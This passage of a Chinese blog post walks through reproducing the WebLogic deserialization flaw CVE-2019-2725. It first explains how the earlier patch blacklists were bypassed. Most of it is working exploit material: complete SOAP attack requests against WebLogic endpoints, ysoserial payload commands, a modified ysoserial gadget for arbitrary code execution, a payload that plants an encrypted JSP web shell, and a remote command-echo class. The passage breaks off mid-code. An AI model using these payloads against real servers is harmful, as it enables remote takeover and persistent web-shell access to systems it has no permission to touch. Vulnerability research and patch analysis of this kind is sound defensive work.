+<p>先来看一下CVE-2017-10271的补丁代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">public void startElement(String uri, String localName, String qName, Attributesattributes)throws SAXException &#123;</div><div class="line">            if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</div><div class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</div><div class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</div><div class="line">            &#125; else &#123;</div><div class="line">               if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</div><div class="line">                  for(int attClass = 0; attClass &lt; attributes.getLength();++attClass) &#123;</div><div class="line">                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass)))&#123;</div><div class="line">                        throw new IllegalStateException(&quot;Invalid attribute for elementvoid:&quot; + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line">               if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</div><div class="line">                  String var9 =attributes.getValue(&quot;class&quot;);</div><div class="line">                  if(var9 != null &amp;&amp;!var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</div><div class="line">                     throw new IllegalStateException(&quot;The value of class attribute is notvalid for array element.&quot;);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
+<p>其中CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是必须要是byte类型的。<br>绕过CVE-2017-10271补丁是因为class标签未被过滤所导致的，这点我们可以从Oracle 发布的CVE-2019-2725补丁看出来，<br>CVE-2019-2725补丁新增部分内容，将class加入了黑名单，限制了array标签中的byte长度。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">else if (qName.equalsIgnoreCase(&quot;class&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:class&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">else &#123;</div><div class="line">       if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</div><div class="line">          String attClass = attributes.getValue(&quot;class&quot;);</div><div class="line">          if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(&quot;byte&quot;)) &#123;</div><div class="line">             throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</div><div class="line">          &#125;</div><div class="line">          String lengthString = attributes.getValue(&quot;length&quot;);</div><div class="line">          if (lengthString != null) &#123;</div><div class="line">             try &#123;</div><div class="line">                int length = Integer.valueOf(lengthString);</div><div class="line">                if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</div><div class="line">                   throw new IllegalStateException(&quot;Exceed array length limitation&quot;);</div><div class="line">                &#125;</div><div class="line">                this.overallarraylength += length;</div><div class="line">                if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</div><div class="line">                   throw new IllegalStateException(&quot;Exceed over all array limitation.&quot;);</div><div class="line">                &#125;</div><div class="line">             &#125; catch (NumberFormatException var8) &#123;</div></pre></td></tr></table></figure></p>
+<p>复现：</p>
+<h4 id="Weblogic-10-3-6-利用oracle-toplink-internal-sessions-UnitOfWorkChangeSet构造函数执行readObject"><a href="#Weblogic-10-3-6-利用oracle-toplink-internal-sessions-UnitOfWorkChangeSet构造函数执行readObject" class="headerlink" title="Weblogic 10.3.6 利用oracle.toplink.internal.sessions.UnitOfWorkChangeSet构造函数执行readObject()."></a>Weblogic 10.3.6 利用oracle.toplink.internal.sessions.UnitOfWorkChangeSet构造函数执行readObject().</h4><p>构造函数<a href="http://kickjava.com/src/oracle/toplink/essentials/internal/sessions/UnitOfWorkChangeSet.java.htm" target="_blank" rel="external">参考</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFoundException &#123;</div><div class="line">	java.io.ByteArrayInputStream  byteIn = new java.io.ByteArrayInputStream(bytes);</div><div class="line">	ObjectInputStream objectIn = new ObjectInputStream(byteIn);</div><div class="line"> //bug 4416412: allChangeSets set directly instead of using setInternalAllChangeSets</div><div class="line">	allChangeSets = (IdentityHashtable)objectIn.readObject();</div><div class="line">    deletedObjects = (IdentityHashtable)objectIn.readObject();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>UnitOfWorkChangeSet的参数是一个Byte数组，因此我们需要将Payload转换为Byte[].</p>
+<p>利用ysoserial生成Payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar Jdk7u21 &quot;cmd /c echo lxhsec &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx.txt&quot; &gt; payload.txt</div></pre></td></tr></table></figure></p>
+<p>然后使用下列代码，将Payload进行转换成Byte[]<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">        File file = <span class="keyword">new</span> File(<span class="string">"C:\\Users\\lxhsec\\Downloads\\JRE8u20_RCE_Gadget-master\\exploit.ser"</span>);</div><div class="line">        <span class="comment">//读取ysoserial文件生成的payload</span></div><div class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</div><div class="line"></div><div class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream((<span class="keyword">int</span>) file.length());</div><div class="line"></div><div class="line">        <span class="keyword">int</span> buf_size=<span class="number">1024</span>;</div><div class="line">        <span class="keyword">byte</span>[] buffer=<span class="keyword">new</span> <span class="keyword">byte</span>[buf_size];</div><div class="line">        <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">while</span>(-<span class="number">1</span> != (len=fileInputStream.read(buffer,<span class="number">0</span>,buf_size)))&#123;</div><div class="line">            byteArrayOutputStream.write(buffer,<span class="number">0</span>,len);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        BufferedOutputStream oop = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"C:\\Users\\lxhsec\\Downloads\\ysoserial-master\\target\\result.txt"</span>)));</div><div class="line"></div><div class="line">        <span class="comment">//使用jdk的xmlencoder把byte数组写入到 result.txt</span></div><div class="line">        XMLEncoder xmlEncoder = <span class="keyword">new</span> XMLEncoder(oop);</div><div class="line">        xmlEncoder.flush();</div><div class="line">        xmlEncoder.writeObject(byteArrayOutputStream.toByteArray());</div><div class="line">        xmlEncoder.close();</div><div class="line">        byteArrayOutputStream.close();</div><div class="line">        fileInputStream.close();</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>拼接Payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 127.0.0.1:7001</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept:*/*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 178338</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;      </div><div class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;</div><div class="line">//此处填写上面生成的XML。</div><div class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>效果:<br><img src="/2019/03/04/middleware/CVE-2019-2725-06.png" alt="CVE-2019-2725-06.png"></p>
+<p>使用ysoserial生成的只能适用于Windows平台，如果在Linux平台使用，则又要进行一次编译，兼容性有点不太好，因此我们可以<br>将ysoserial稍稍的进行更改。</p>
+<p>这里我们将ysoserial的Gadgets.java文件进行更改。路径为：<code>ysoserial-master\src\main\java\ysoserial\payloads\util\Gadgets.java</code>.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">  <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></div><div class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">      <span class="keyword">final</span> T templates = tplClass.newInstance();</div><div class="line"></div><div class="line">      <span class="comment">// use template gadget class</span></div><div class="line">      ClassPool pool = ClassPool.getDefault();</div><div class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</div><div class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</div><div class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</div><div class="line"></div><div class="line"><span class="comment">// ---Start</span></div><div class="line">String cmd = <span class="string">""</span>;</div><div class="line"></div><div class="line">      <span class="keyword">if</span>(command.startsWith(<span class="string">"filename:"</span>)) &#123;</div><div class="line">          String filename = command.substring(<span class="number">9</span>);</div><div class="line">          <span class="keyword">try</span> &#123;</div><div class="line">              File file = <span class="keyword">new</span> File(filename);</div><div class="line">              <span class="keyword">if</span> (file.exists()) &#123;</div><div class="line">                  FileReader reader = <span class="keyword">new</span> FileReader(file);</div><div class="line">                  BufferedReader br = <span class="keyword">new</span> BufferedReader(reader);</div><div class="line">                  StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</div><div class="line">                  String line = <span class="string">""</span>;</div><div class="line">                  <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</div><div class="line">                      sb.append(line);</div><div class="line">                      sb.append(<span class="string">"\r\n"</span>);</div><div class="line">                  &#125;</div><div class="line">                  cmd = sb.toString();</div><div class="line">              &#125; <span class="keyword">else</span> &#123;</div><div class="line">                  System.err.println(String.format(<span class="string">"filename %s not exists!"</span>, filename));</div><div class="line">                  System.exit(<span class="number">0</span>);</div><div class="line">              &#125;</div><div class="line">          &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">              e.printStackTrace();</div><div class="line">          &#125;</div><div class="line">      &#125;<span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">// run command in static initializer</span></div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></div><div class="line">          cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</div><div class="line">                  command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</div><div class="line">                  <span class="string">"\");"</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">System.err.println(cmd);	</div><div class="line"><span class="comment">// ---end</span></div><div class="line">	</div><div class="line">      clazz.makeClassInitializer().insertAfter(cmd);</div><div class="line">      <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></div><div class="line">      clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</div><div class="line">      CtClass superC = pool.get(abstTranslet.getName());</div><div class="line">      clazz.setSuperclass(superC);</div><div class="line"></div><div class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</div><div class="line"></div><div class="line">      <span class="comment">// inject class bytes into instance</span></div><div class="line">      Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</div><div class="line">          classBytes, ClassFiles.classAsBytes(Foo.class)</div><div class="line">      &#125;);</div><div class="line"></div><div class="line">      <span class="comment">// required to make TemplatesImpl happy</span></div><div class="line">      Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</div><div class="line">      Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</div><div class="line">      <span class="keyword">return</span> templates;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>保存后重新编译<code>mvn clean package -DskipTests</code>.</p>
+<p>编译使用的是JDK1.8</p>
+<p>修改后的ysoserial，将命令执行，转换成了代码执行。</p>
+<p>整个兼容两边平台的代码TestCode.txt。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//TestCode.txt</span></div><div class="line">String WEB_PATH = <span class="string">"servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echolxhsec.jsp"</span>;</div><div class="line">String ShellContent = <span class="string">"&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(\"pass\")!=null)&#123;String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">	java.io.PrintWriter printWriter = <span class="keyword">new</span> java.io.PrintWriter(WEB_PATH);</div><div class="line">	printWriter.println(ShellContent);</div><div class="line">	printWriter.close();</div><div class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">	e.printStackTrace();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>执行：<br><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 &quot;filename:C:\Users\lxhsec\Desktop\TestCode.txt&quot; &gt; result.txt</code><br><img src="/2019/03/04/middleware/CVE-2019-2725-04.png" alt="CVE-2019-2725-04.png"></p>
+<p>reuslt.txt转换成Byte[]后执行，如下：<br><img src="/2019/03/04/middleware/CVE-2019-2725-05.png" alt="CVE-2019-2725-05.png"></p>
+<p>访问:<code>http://127.0.0.1:7001/_async/echolxhsec.jsp</code></p>
+<h4 id="Weblogic-12-1-3-利用org-slf4j-ext-EventData构造函数执行readObject"><a href="#Weblogic-12-1-3-利用org-slf4j-ext-EventData构造函数执行readObject" class="headerlink" title="Weblogic 12.1.3 利用org.slf4j.ext.EventData构造函数执行readObject()."></a>Weblogic 12.1.3 利用org.slf4j.ext.EventData构造函数执行readObject().</h4><p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet在Weblogic 12.1.3中不存在，因此需要重新找利用链。<br><img src="/2019/03/04/middleware/CVE-2019-2725-08.png" alt="CVE-2019-2725-08.png"></p>
+<p>Weblogic的黑名单只会过滤传入的第一层XML，使用org.slf4j.ext.EventData传入的第一层XML是String，因此绕过黑名单检测。</p>
+<p>构造函数<a href="http://www.docjar.com/html/api/org/slf4j/ext/EventData.java.html" target="_blank" rel="external">参考</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">EventData</span><span class="params">(String xml)</span> </span>&#123;</div><div class="line">	ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(xml.getBytes());</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">	 XMLDecoder decoder = <span class="keyword">new</span> XMLDecoder(bais);</div><div class="line">	 <span class="keyword">this</span>.eventData = (Map&lt;String, Object&gt;) decoder.readObject();</div><div class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">	 <span class="keyword">throw</span> <span class="keyword">new</span> EventException(<span class="string">"Error decoding "</span> + xml, e);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>构造写入文件Payload，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">POST /_async/AsyncResponseService HTTP/1.1</div><div class="line">Host: 192.168.124.129:7001</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 962</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;      </div><div class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;</div><div class="line">&lt;![CDATA[&lt;java&gt;</div><div class="line">        &lt;object class=&quot;java.io.PrintWriter&quot;&gt;     </div><div class="line">        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;</div><div class="line">       &lt;void method=&quot;println&quot;&gt;</div><div class="line">       &lt;string&gt;lxhsecTest&lt;/string&gt;</div><div class="line">       &lt;/void&gt;</div><div class="line">       &lt;void method=&quot;close&quot;/&gt;</div><div class="line">      &lt;/object&gt;</div><div class="line">      &lt;/java&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;</div><div class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>结果:<br><img src="/2019/03/04/middleware/CVE-2019-2725-07.png" alt="CVE-2019-2725-07.png"></p>
+<h3 id="wls-wsat-war"><a href="#wls-wsat-war" class="headerlink" title="wls-wsat.war"></a>wls-wsat.war</h3><h4 id="Weblogic-10-3-6-回显构造"><a href="#Weblogic-10-3-6-回显构造" class="headerlink" title="Weblogic 10.3.6 回显构造."></a>Weblogic 10.3.6 回显构造.</h4><p>bea_wls9_async_response.war的反序列化链无法造成回显，但是wls-wsat.war的却可以。</p>
+<p>访问：/wls-wsat/CoordinatorPortType</p>
+<p>以下测试均在 JDK 1.6.0_45 64bit 下进行。</p>
+<p>拿<a href="https://github.com/lufeirider/CVE-2019-2725" target="_blank" rel="external">lufei</a>大佬的工具改改。</p>
+<p>这里我直接使用lufei的工具，发现 &gt; 等特殊字符，会被当成字符串。<br><img src="/2019/03/04/middleware/CVE-2019-2725-02.png" alt="CVE-2019-2725-02.png"></p>
+<p>这里将工具的exec函数更改，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResultBaseExec</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        String osTyp = System.getProperty(<span class="string">"os.name"</span>);</div><div class="line">        Process p;</div><div class="line">        <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</div><div class="line">            <span class="comment">//执行命令</span></div><div class="line"><span class="comment">//            p = Runtime.getRuntime().exec("cmd /c " + cmd);</span></div><div class="line">            p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="comment">//执行命令</span></div><div class="line"><span class="comment">//            p = Runtime.getRuntime().exec("/bin/sh -c " + cmd);</span></div><div class="line">            p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, cmd&#125;);</div><div class="line">        &#125;</div><div class="line">        InputStream fis=p.getInputStream();</div><div class="line">        InputStreamReader isr=<span class="keyword">new</span> InputStreamReader(fis);</div><div class="line">        BufferedReader br=<span class="keyword">new</span> BufferedReader(isr);</div><div class="line">        String line=<span class="keyword">null</span>;</div><div class="line">        String result = <span class="string">""</span>;</div><div class="line">        <span class="keyword">while</span>((line=br.readLine())!=<span class="keyword">null</span>)</div><div class="line">        &#123;</div><div class="line">            result = result + line;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译成.class文件<br><code>&quot;C:\Program Files\Java\jdk1.6.0_45\bin\javac.exe&quot; C:\Users\lxhsec\Downloads\WeblogicCode\src\main\java\ResultBaseExec.java</code></p>
+<p>接着将.class转换成Base64，当然你转成hex这些也可以。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">toBase64</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException, IOException &#123;</div><div class="line"></div><div class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">4</span>];</div><div class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ((n = in.read(buffer)) != -<span class="number">1</span>) &#123;</div><div class="line">            out.write(buffer, <span class="number">0</span>, n);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> out.toByteArray();</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        BASE64Encoder base64Encoder = <span class="keyword">new</span> BASE64Encoder();</div><div class="line">		</div><div class="line">		<span class="comment">//class文件路径</span></div><div class="line">        InputStream 